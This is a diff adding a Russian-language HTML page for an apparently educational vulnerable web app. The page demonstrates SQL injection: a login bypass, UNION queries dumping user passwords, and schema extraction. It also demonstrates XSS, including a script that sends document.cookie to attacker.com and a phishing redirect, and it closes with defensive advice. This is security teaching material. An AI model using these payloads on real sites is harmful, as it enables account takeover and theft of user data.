@@ -1,0 +1,108 @@
+<!-- templates/demo.html -->
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Демонстрация атак</title>
+    <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>Демонстрация эксплуатации уязвимостей</h1>
+            <nav>
+                <a href="/">Главная</a>
+                <a href="/search">Поиск (SQL-инъекция)</a>
+                <a href="/login">Вход (SQL-инъекция)</a>
+                <a href="/comments">Комментарии (XSS)</a>
+                <a href="/safe-search">Безопасный поиск</a>
+                <a href="/safe-comments">Безопасные комментарии</a>
+                <a href="/demo">Демонстрация атак</a>
+            </nav>
+        </header>
+        
+        <main>
+            
+            <section>
+                <h2>Демонстрация SQL-инъекций</h2>
+                
+                <h3>1. Обход аутентификации</h3>
+                <p>На странице <a href="/login">входа</a> попробуйте использовать следующие данные:</p>
+                <ul>
+                    <li>Имя пользователя: <code>' OR '1'='1</code></li>
+                    <li>Пароль: <code>' OR '1'='1</code></li>
+                </ul>
+                <p>Это позволит войти без правильных учетных данных.</p>
+                
+                <h3>2. Извлечение всех данных</h3>
+                <p>На странице <a href="/search">поиска</a> введите:</p>
+                <ul>
+                    <li><code>' OR '1'='1</code> - покажет всех пользователей</li>
+                    <li><code>' UNION SELECT id, username, password, email FROM users--</code> - покажет всех пользователей с паролями</li>
+                </ul>
+                
+                <h3>3. Извлечение структуры базы данных</h3>
+                <p>В том же поиске попробуйте:</p>
+                <ul>
+                    <li><code>' UNION SELECT 1,sql,3,4 FROM sqlite_master WHERE type='table'--</code></li>
+                </ul>
+            </section>
+            
+            <section>
+                <h2>Демонстрация XSS атак</h2>
+                
+                <h3>1. Простой alert</h3>
+                <p>На странице <a href="/comments">комментариев</a> добавьте комментарий с содержимым:</p>
+                <ul>
+                    <li><code>&lt;script&gt;alert('XSS!')&lt;/script&gt;</code></li>
+                    <li><code>&lt;img src="x" onerror="alert('XSS')"&gt;</code></li>
+                </ul>
+                
+                <h3>2. Кража cookies</h3>
+                <p>Более опасная XSS атака может украсть cookies пользователей:</p>
+                <ul>
+                    <li><code>&lt;script&gt;fetch('https://attacker.com/steal?cookie='+document.cookie)&lt;/script&gt;</code></li>
+                </ul>
+                <p>В реальной атаке злоумышленник заменит <code>attacker.com</code> на свой сервер.</p>
+                
+                <h3>3. Перенаправление пользователя</h3>
+                <ul>
+                    <li><code>&lt;script&gt;window.location='https://phishing-site.com'&lt;/script&gt;</code></li>
+                </ul>
+            </section>
+            
+            <section class="safe">
+                <h2>Защита от уязвимостей</h2>
+                
+                <h3>Против SQL-инъекций:</h3>
+                <ul>
+                    <li>Всегда используйте параметризованные запросы или prepared statements</li>
+                    <li>Никогда не вставляйте пользовательский ввод напрямую в SQL</li>
+                    <li>Используйте ORM (Object-Relational Mapping) библиотеки</li>
+                    <li>Ограничивайте привилегии базы данных</li>
+                </ul>
+                
+                <h3>Против XSS:</h3>
+                <ul>
+                    <li>Всегда экранируйте HTML при выводе пользовательского контента</li>
+                    <li>Используйте контекстное экранирование (HTML, JS, CSS, URL)</li>
+                    <li>Устанавливайте заголовок Content-Security-Policy</li>
+                    <li>Используйте HTTPOnly флаг для cookies</li>
+                    <li>Валидируйте и санируйте пользовательский ввод</li>
+                </ul>
+                
+                <p>Посмотрите безопасные версии страниц:</p>
+                <ul>
+                    <li><a href="/safe-search">Безопасный поиск</a> - использует параметризованные запросы</li>
+                    <li><a href="/safe-comments">Безопасные комментарии</a> - экранирует HTML</li>
+                </ul>
+            </section>
+        </main>
+        
+        <footer>
+            <p>Демонстрационный сайт для обучения безопасности. Никогда не используйте уязвимый код в продакшене!</p>
+        </footer>
+    </div>
+</body>
+</html>
